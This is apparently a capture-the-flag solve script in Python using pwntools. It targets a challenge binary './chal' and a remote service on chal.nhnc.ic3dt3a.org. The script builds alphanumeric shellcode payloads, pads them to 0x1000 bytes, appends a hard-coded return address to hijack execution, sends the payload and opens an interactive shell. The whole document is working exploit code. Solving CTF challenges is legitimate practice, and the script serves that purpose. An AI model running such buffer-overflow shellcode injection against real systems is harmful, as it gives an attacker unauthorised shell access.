#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "50"]
host, port = 'chal.nhnc.ic3dt3a.org', 2001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================

def exploit():
    global io
    io = initialize()
# https://blackcloud.me/Linux-shellcode-alphanumeric/ 
    shellcode = (
       b"j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A"
    )
# https://nets.ec/Alphanumeric_shellcode
    shellcode2 = (
       b"jZTYX4UPXk9AHc49149hJG00X5EB00PXHc1149Hcq01q0Hcq41q4Hcy0Hcq0WZhZUXZX5u7141A0hZGQjX5u49j1A4H3y0XWjXHc9H39XTH394c"
    )
    payload = shellcode + b"Y"*(0x1000 - len(shellcode)) + b"\xff\xe4\x79\xf7\xff\xbf"
    payload2 = shellcode2 + b"Y"*(0x1000 - len(shellcode2)) + b"\x26\xe7\xff\xff\xff\x7f"
    io.sendline(payload2)
    io.interactive()
    
if __name__ == '__main__':
    exploit()

